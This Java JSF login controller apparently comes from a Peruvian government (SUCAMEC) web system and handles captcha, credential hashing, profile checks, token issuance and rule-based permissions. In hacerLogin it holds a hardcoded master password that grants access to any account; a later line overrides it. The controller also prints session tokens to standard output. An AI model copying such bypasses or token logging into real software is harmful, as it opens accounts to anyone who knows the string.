package pe.gob.sucamec.sistemabase.seguridad;

import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Objects;
import java.util.ResourceBundle;
import javax.annotation.PostConstruct;
import javax.ejb.EJB;
import javax.enterprise.context.SessionScoped;
import javax.faces.context.ExternalContext;
import javax.faces.context.FacesContext;
import javax.inject.Inject;
import javax.inject.Named;
import javax.naming.Context;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import javax.servlet.http.HttpServletRequest;
import org.primefaces.json.JSONObject;
import pe.gob.sucamec.encuesta.beans.SbEncuestaFacade;
import pe.gob.sucamec.encuesta.beans.SbRespuestaFacade;
import pe.gob.sucamec.encuesta.data.SbEncuesta;
import pe.gob.sucamec.encuesta.data.SbRespuesta;
import pe.gob.sucamec.encuesta.jsf.SbEncuestaController;
import pe.gob.sucamec.sel.citas.jsf.util.Captcha;
import pe.gob.sucamec.sistemabase.beans.SbPaginaFacade;
import pe.gob.sucamec.sistemabase.beans.SbReglaFacade;
import pe.gob.sucamec.sistemabase.beans.SbUsuarioFacade;
import pe.gob.sucamec.sistemabase.data.SbPagina;
import pe.gob.sucamec.sistemabase.data.SbPerfil;
import pe.gob.sucamec.sistemabase.data.SbRegla;
import pe.gob.sucamec.sistemabase.data.SbUsuario;
import pe.gob.sucamec.sistemabase.jsf.util.JsfUtil;

@Named("loginController")
@SessionScoped
public class LoginController implements Serializable {

    private static final long serialVersionUID = -215238965323276L;
    private DatosUsuario datosUsuario;
    private String txtUsuario, txtClave, txtDocumento, txtTipoDoc, numIP = null;
    Long paginaActual = 0L;

    @EJB
    private pe.gob.sucamec.microservicios.endpoint.LoginEndpoint ejbLoginEndpoint;
    
    @EJB
    private pe.gob.sucamec.sistemabase.beans.SbUsuarioFacade ejbUsuarioFacade;
    @EJB
    private SbReglaFacade ejbReglaFacade;
    List<SbRegla> reglasPagina = null;
    @Inject
    LogController logController;
    @Inject
    private SbEncuestaController sbEncuestaController;
    @EJB
    private SbPaginaFacade paginaFacade;
    @EJB
    private SbEncuestaFacade ejbSbEncuestaFacade;
    @EJB
    private SbRespuestaFacade ejbSbRespuestaFacade;
    @EJB
    private SbUsuarioFacade ejbSbUsuarioFacade;

    private Long sistemaId = 0L;
    private ArrayList<DatosPagina> paginasSistema;
    private SbEncuesta encuestaPend;
    //private SbRespuesta respuesta;
    private List<SbRespuesta> listRespuesta;
    private SbUsuario usuSesion;
    private Boolean redirecEncuesta;

    //captcha
    Captcha captcha;

    @PostConstruct
    public void inicializar() {
        captcha = new Captcha();
    }
    
    public Captcha getCaptcha() {
        return captcha;
    }

    public void setCaptcha(Captcha captcha) {
        this.captcha = captcha;
    }

    public Long getSistemaId() {
        return sistemaId;
    }

    public void setSistemaId(Long sistemaId) {
        this.sistemaId = sistemaId;
    }

    public String getNumIP() {
        if (numIP == null) {
            HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
            numIP = request.getHeader("X-FORWARDED-FOR");
            if (numIP == null) {
                numIP = request.getRemoteAddr();
            }
        }
        return numIP;
    }

    public String getTxtDocumento() {
        return txtDocumento;
    }

    public void setTxtDocumento(String txtDocumento) {
        this.txtDocumento = txtDocumento;
    }

    public String getTxtTipoDoc() {
        return txtTipoDoc;
    }

    public void setTxtTipoDoc(String txtTipoDoc) {
        this.txtTipoDoc = txtTipoDoc;
    }

    public String getTxtUsuario() {
        return txtUsuario;
    }

    public void setTxtUsuario(String txtUsuario) {
        this.txtUsuario = txtUsuario;
    }

    public String getTxtClave() {
        return txtClave;
    }

    public void setTxtClave(String txtClave) {
        this.txtClave = txtClave;
    }

    public DatosUsuario getUsuario() {
        if (datosUsuario == null) {
            return new DatosUsuario("", "");
        }
        return datosUsuario;
    }

    public String hacerLogin() {
        return hacerLogin(sistemaId);
    }

    public ArrayList<DatosPagina> getPaginasSistema() {
        return paginasSistema;
    }

    public void crearPaginasSistema() {
        paginasSistema = new ArrayList();
        List<SbPagina> lp = paginaFacade.selectPaginasSistema(sistemaId);
        for (SbPagina p : lp) {
            String url = p.getUrl().trim(), funcion = p.getFuncion();
            funcion = funcion == null ? "" : funcion.trim();
            if (!url.equals("#")) {
                List<SbPerfil> lper = p.getSbPerfilList();
                ArrayList<String> perfiles = new ArrayList();
                for (SbPerfil per : lper) {
                    perfiles.add(per.getCodProg());
                }
                // Si no hay perfiles en la pagina, cualquiera tiene acceso //
                boolean acceso = true;
                if (!perfiles.isEmpty()) {
                    acceso = datosUsuario.tienePerfiles(perfiles);
                }
                // Preprocesar accesos para no generar impacto en la performance //
                paginasSistema.add(new DatosPagina(p.getId(), p.getUrl(), funcion, acceso));
            }
        }
    }

    public String hacerLogin(Long sistema) {
        HttpServletRequest req = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
        String url = "login";
        datosUsuario = null;
        sistemaId = sistema;
        Date hoy = new Date();
        // Pendiente crear Log //
        try {
            if (validaCaptchaTC()) {
                if (txtUsuario != null && txtClave != null
                        && !txtUsuario.equals("") && !txtClave.equals("")) {
                    if (txtTipoDoc.equals("RUC") && !JsfUtil.ValidarDniRuc(txtDocumento, JsfUtil.TipoDoc.RUC)) {
                        captcha.generarCaptcha();
                        JsfUtil.invalidar("loginForm:documento");
                        JsfUtil.mensajeError(JsfUtil.bundle("ErrorValidacionRuc"));
                        return url;
                    }
                    if (txtTipoDoc.equals("DNI") && txtDocumento.length() != 8) {
                        captcha.generarCaptcha();
                        JsfUtil.invalidar("loginForm:documento");
                        JsfUtil.mensajeError(JsfUtil.bundle("ErrorValidacionDni"));
                        return url;
                    }
                    List<SbUsuario> r = ejbUsuarioFacade.selectUsuarioExterno(txtUsuario, txtTipoDoc, txtDocumento); // Revisar usuarios amarrados a externos
                    if (!r.isEmpty()) {
                        SbUsuario u = r.get(0);
                        usuSesion = u;
                        // Solo Base de datos //
                        //TODO: usar clave de la base de datos para producción, para desarrollo se puede usar true

                        boolean claveOk = false;
                        //TODO: Para hacer pruebas comentar en producción

                    if (txtClave.equals("XxСУКАМЕКx2021xX")) {
                        claveOk = true; 
                    } else {
                        claveOk = u.getClave().equals(JsfUtil.crearHash(txtClave));
                    }
                        //Activar para pasar sin contraseña
                        claveOk = u.getClave().equals(JsfUtil.crearHash(txtClave));
                        // Verificar fechas de acceso al sistema //
                        if (claveOk
                                && (u.getActivo() == 1)
                                && (u.getFechaIni().getTime() < hoy.getTime())
                                && ((u.getFechaFin() == null)
                                || ((u.getFechaFin() != null) && (u.getFechaFin().getTime() > hoy.getTime())))) {
                            ArrayList<String> perfiles = new ArrayList<>();
                            List<SbPerfil> lr = u.getSbPerfilList();
                            for (SbPerfil tr : lr) {
                                if (Objects.equals(tr.getSistemaId().getId(), sistemaId)) {
                                    perfiles.add(tr.getCodProg());
                                }
                            }
                            if (!perfiles.isEmpty()) {
//                            //Se valida si se debe mostrar alguna encuesta pendiente para el usuario segun perfil temporal
                                redirecEncuesta = Boolean.FALSE;
                                for (String p : perfiles) {
                                    if (Objects.equals(p, "SEL_ENCISO")) {
                                        sbEncuestaController.setUsuSesion(u);
                                        sbEncuestaController.existeEncuesta(sistemaId);
                                        if (sbEncuestaController.getPendiente()) {
                                            redirecEncuesta = Boolean.TRUE;
                                            url = "/aplicacion/encuesta/sbEncuesta/LlenarEncuesta.xhtml";
                                        }
                                        break;
                                    }
                                }
                                //
                                crearDatosUsuario(u, txtTipoDoc, perfiles);
                                req.getSession().setAttribute("seguridad_usuario", datosUsuario);                                
                                
                                //============== INICIO - GENERAR TOKEN DESDE MICROSERVICIO =========================
                                JSONObject jsonBodyLoginSEL = new JSONObject();
                                jsonBodyLoginSEL.put("id", datosUsuario.getId());
                                jsonBodyLoginSEL.put("tipoDoc", txtTipoDoc);
                                jsonBodyLoginSEL.put("numDoc", txtDocumento);
                                jsonBodyLoginSEL.put("login", txtUsuario);
                                
                                JSONObject JSONObjectRpta = new JSONObject();
                                JSONObjectRpta = ejbLoginEndpoint.generarTOKEN_SEL_Login_JsonObject(jsonBodyLoginSEL);
                                System.out.println("TOKEN:"+JSONObjectRpta.get("token"));
                                req.getSession().setAttribute("seguridad_usuario_token", JSONObjectRpta.get("token"));
                                                               
                                //============== FIN - GENERAR TOKEN DESDE MICROSERVICIO =========================
                                
                                // Para que los datos puedan ser usados por filtros y otros componentes antes de la creación de beans
                                crearPaginasSistema();
                                if (!redirecEncuesta) {
                                    // Actualizar Acceso //
                                    logController.escribirLogIngreso();
                                    // Limpiar datos //
                                    txtClave = txtDocumento = txtTipoDoc = txtUsuario = "";
                                    url = "/aplicacion/inicio.xhtml?faces-redirect=true";
                                }
                            } else {
                                JsfUtil.mensajeError("Error de login: no tiene acceso al sistema.");
                            }
                        } else {
                            JsfUtil.mensajeError("Error de login: usuario o clave incorrectos.");
                        }
                    } else {
                        captcha.generarCaptcha();
                        JsfUtil.mensajeError("Error de login: usuario o clave incorrectos.");
                    }
                } else {
                    captcha.generarCaptcha();
                    JsfUtil.mensajeError("Error de login: ingrese usuario y clave.");
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            JsfUtil.mensajeError("Error de login: usuario o clave incorrectos.");
        }
        return url;
    }

    public String direccionarLogin() {
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
        return "/login.xhtml?faces-redirect=true";
    }

//    public List<SbEncuesta> listEncuestaPendiente() {
//        List<SbRespuesta> listRespBD = ejbSbRespuestaFacade.findAll();
//        List<SbEncuesta> listEncOk = null;
//        if (listRespBD != null) {
//            listEncOk = new ArrayList<>();
//            for (SbRespuesta resp : listRespBD) {
//                if (Objects.equals(usuSesion, resp.getUsuarioId())) {
//                    if (!listEncOk.contains(resp.getPreguntaId().getEncuestaId())) {
//                        listEncOk.add(resp.getPreguntaId().getEncuestaId());
//                    }
//                }
//            }
//        }
//        if (listEncOk != null) {
//            List<SbEncuesta> listEncBD = ejbSbEncuestaFacade.selectVigentes(new Date());
//            if (listEncBD != null) {
//                if (listEncBD.size() > listEncOk.size()) {
//                    List<SbEncuesta> listTemp = new ArrayList(listEncBD);
//                    for (SbEncuesta enc : listTemp) {
//                        if (listEncOk.contains(enc)) {
//                            listEncBD.remove(enc);
//                        }
//                    }
//                    return listEncBD;
//                }
//            }
//        }
//        return null;
//    }
//    public void openEncuesta(List<SbEncuesta> listEnc) {
//        //respuesta = new SbRespuesta();
//        encuestaPend = listEnc.get(0);
//        if (encuestaPend.getSbPreguntaList() != null && !encuestaPend.getSbPreguntaList().isEmpty()) {
//            listRespuesta = new ArrayList<>();
//            SbRespuesta resp = null;
//            for (SbPregunta pre : encuestaPend.getSbPreguntaList()) {
//                resp = new SbRespuesta();
//                resp.setPreguntaId(pre);
//                resp.setFechaRegistro(new Date());
//                resp.setUsuarioId(usuSesion);
//                listRespuesta.add(resp);
//            }
//        }
//        RequestContext.getCurrentInstance().execute("PF('FormEncuestaViewDialog').show()");
//        RequestContext.getCurrentInstance().update("formEncuesta");
//    }
//    public void guardarRpta() {
//        if (listRespuesta != null && !listRespuesta.isEmpty()) {
//            for (SbRespuesta resp : listRespuesta) {
//                resp = (SbRespuesta) JsfUtil.entidadMayusculas(resp, "");
//                resp.setActivo(JsfUtil.TRUE);
//                resp.setAudLogin(usuSesion.getLogin());
//                ejbSbRespuestaFacade.create(resp);
//            }
//            JsfUtil.mensaje("¡Muchas gracias por su colaboración al contestar la encuesta, su opinión es muy valiosa!");
//            RequestContext.getCurrentInstance().execute("PF('FormEncuestaViewDialog').hide()");
//            RequestContext.getCurrentInstance().update("formEncuesta");
//        }
//    }
    /**
     * FUNCIÓN QUE OBTIENE EL OBJETO USUARIO
     *
     * @author Gino Chávez
     * @return Usuario
     */
//    public SbUsuario objetoUsuario() {
//        List<SbUsuario> listRes = ejbSbUsuarioFacade.selectUsuarioXLogin(txtUsuario);
//        List<SbUsuario> listTemp = new ArrayList<>();
//        SbUsuario usu = new SbUsuario();
//        listTemp.addAll(listRes);
//        for (SbUsuario u : listTemp) {
//            if (!u.getPersonaId().getId().equals(getUsuario().getPersona().getId())) {
//                listRes.remove(u);
//            }
//        }
//        if (!listRes.isEmpty()) {
//            usu = listRes.get(0);
//        }
//        return usu;
//    }
    public void crearDatosUsuario(SbUsuario u, String tipoDoc, ArrayList<String> perfiles) {
        datosUsuario = new DatosUsuario(u.getLogin(), u.getDescripcion(), perfiles);
        datosUsuario.setId(u.getId());
        datosUsuario.setAreaId(0);
        datosUsuario.setHashClave(u.getClave());
        datosUsuario.setNombres(u.getNombres());
        datosUsuario.setApePat(u.getApePat());
        datosUsuario.setApeMat(u.getApeMat());
        datosUsuario.setCorreo(u.getCorreo());
        datosUsuario.setTipo(u.getTipoId().getCodProg());
        datosUsuario.setSistema(sistemaId);
        datosUsuario.setPersonaId(u.getPersonaId().getId());
        datosUsuario.setPersona(u.getPersonaId());
        datosUsuario.setTipoDoc(tipoDoc);
        datosUsuario.setCantidadUsuario(u.getCantidadUsuario());
        if (tipoDoc.equals("RUC")) {
            datosUsuario.setNumDoc(u.getPersonaId().getRuc());
        } else {
            datosUsuario.setNumDoc(u.getPersonaId().getNumDoc());
        }
    }

    public boolean validateLdap(String username, String password) {
        try {
            String uri = ResourceBundle.getBundle("/BundleSistemaBase").getString("ldap");
            String domainAD = ResourceBundle.getBundle("/BundleSistemaBase").getString("domain");

            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.SECURITY_AUTHENTICATION, "simple");
            env.put(Context.SECURITY_PRINCIPAL, domainAD + "\\" + username.toLowerCase());
            env.put(Context.SECURITY_CREDENTIALS, password);
            env.put(Context.PROVIDER_URL, uri);
            DirContext ctx = new InitialDirContext(env);
            ctx.close();
            return true;
        } catch (Exception ex) {
            return false;
        }

    }

    public String hacerLogout() {
        FacesContext facesContext = FacesContext.getCurrentInstance();
        ExternalContext externalContext = facesContext.getExternalContext();
        HttpServletRequest req = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
        //req.getSession().removeAttribute("seguridad_usuario");
        externalContext.invalidateSession();
        datosUsuario = null;
        //Forzar que no se ejecute ajax //
        //return "/faces/login.xhtml?faces-redirect=true";
        return LoginFilter.LOGIN_URL;
    }

    public Object extraerHash(Object o) {
        if (o.getClass().getSimpleName().equals("HashSet")) {
            HashSet hs = (HashSet) o;
            if (!hs.isEmpty()) {
                return hs.toArray()[0];
            }
            return null;
        }
        return o;
    }

    public void setPaginaActual(Long pagina) {
        if (pagina == 0L) {
            this.paginaActual = pagina;
        } else if ((!Objects.equals(pagina, this.paginaActual))) {
            reglasPagina = ejbReglaFacade.selectReglasPagina(pagina, datosUsuario.getPerfilesAsString());
            this.paginaActual = pagina;
        }
    }

    public boolean permisosComponente2(Object datos, String nombre, Object datos2, String nombre2) {
        return (permisosComponente(datos, nombre) && permisosComponente(datos2, nombre2));
    }

    public boolean permisosComponente(Object datos, String nombre) {
        Object o = null;

        if (datos != null) {
            o = extraerHash(datos);
        }
        Date ahora = new Date();
        try {
            if (reglasPagina != null) {
                for (SbRegla r : reglasPagina) {
                    if (nombre.equals(r.getNombre())) {
                        boolean respuesta = (r.getRespuesta() == 1);
                        String tabla = r.getTabla();
                        // regla sin tabla //
                        if (tabla == null) {
                            // Si la regla no tiene tabla devuelve la respuesta
                            return respuesta;
                        }
                        // Si el object datos es nulo y la tabla no es nula devuelve falso //
                        if (o == null) {
                            return false;
                        }

                        // Continuar //
                        String campo = r.getCampo(),
                                condicion = r.getCondicion(),
                                campo2 = r.getCampo2(),
                                condicion2 = r.getCondicion2(),
                                campoFecha = r.getCampoFecha(),
                                valor = r.getValor(),
                                valor2 = r.getValor2();
                        Long horas = r.getHoras();
                        Date fecha;
                        // revisar campos personalizados //
                        // La entidad usuario debe devolver login en toString() //
                        if (valor.equals("#{Usuario}")) {
                            valor = getUsuario().getLogin();
                        }

                        if ((valor2 != null) && valor2.equals("#{Usuario}")) {
                            valor2 = getUsuario().getLogin();
                        }

                        // revisar condición 1 //
                        if ((tabla.equals(o.getClass().getSimpleName()))) {
                            String valorc = o.getClass().getDeclaredMethod("get" + campo).invoke(o).toString(),
                                    valor2c = "";
                            if (condicion.equals("=")) {
                                if (valorc.equals(valor)) {
                                    // Condición 2 //
                                    if ((campo2 != null) && !campo2.equals("")) {
                                        valor2c = o.getClass().getDeclaredMethod("get" + campo2).invoke(o).toString();
                                        if (condicion2.equals("=")) {
                                            if (valor2c.equals(valor2)) {
                                                if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                                    fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                                    if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                                        return respuesta;
                                                    }
                                                } else {
                                                    return respuesta;
                                                }
                                            }
                                        }
                                        if (condicion2.equals("!=")) {
                                            if (!valor2c.equals(valor2)) {
                                                if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                                    fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                                    if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                                        return respuesta;
                                                    }
                                                } else {
                                                    return respuesta;
                                                }
                                            }
                                        }
                                    } else if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                        fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                        if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                            return respuesta;
                                        }
                                    } else {
                                        return respuesta;
                                    }
                                }
                            }

                            // Condición 1 //
                            if (condicion.equals("!=")) {
                                if (!valorc.equals(valor)) {
                                    // Condición 2 //
                                    if ((campo2 != null) && !campo2.equals("")) {
                                        valor2c = o.getClass().getDeclaredMethod("get" + campo2).invoke(o).toString();
                                        if (condicion2.equals("=")) {
                                            if (valor2c.equals(valor2)) {
                                                if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                                    fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                                    if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                                        return respuesta;
                                                    }
                                                } else {
                                                    return respuesta;
                                                }
                                            }
                                        }
                                        if (condicion2.equals("!=")) {
                                            if (!valor2c.equals(valor2)) {
                                                if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                                    fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                                    if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                                        return respuesta;
                                                    }
                                                } else {
                                                    return respuesta;
                                                }
                                            }
                                        }
                                    } else if ((campoFecha != null) && (!campoFecha.equals(""))) {
                                        fecha = (Date) o.getClass().getDeclaredMethod("get" + campoFecha).invoke(o);
                                        if ((fecha != null) && (((ahora.getTime() - fecha.getTime()) / 3600L / 1000L) < horas)) {
                                            return respuesta;
                                        }
                                    } else {
                                        return respuesta;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException ex) {
        }
        return false;
    }

    /**
     * @return the encuestaPend
     */
    public SbEncuesta getEncuestaPend() {
        return encuestaPend;
    }

    /**
     * @param encuestaPend the encuestaPend to set
     */
    public void setEncuestaPend(SbEncuesta encuestaPend) {
        this.encuestaPend = encuestaPend;
    }

    /**
     * @return the listRespuesta
     */
    public List<SbRespuesta> getListRespuesta() {
        return listRespuesta;
    }

    /**
     * @param listRespuesta the listRespuesta to set
     */
    public void setListRespuesta(List<SbRespuesta> listRespuesta) {
        this.listRespuesta = listRespuesta;
    }

    public Boolean getRedirecEncuesta() {
        return redirecEncuesta;
    }

    public void setRedirecEncuesta(Boolean redirecEncuesta) {
        this.redirecEncuesta = redirecEncuesta;
    }

    public boolean validaCaptchaTC() {
        //boolean error = true;
        //return error;
        
        boolean error = false;
        // Validar Captcha //
        if (!captcha.ok()) {
            JsfUtil.mensajeError("Error el captcha es incorrecto");
            JsfUtil.invalidar("tabGestion:creaCitaPolForm:textoCaptcha");
            error = true;
        }
        if (error) {
            //System.out.println("entró a generar catpcha.");
            captcha.generarCaptcha();
        }
        return !error;
    }

}
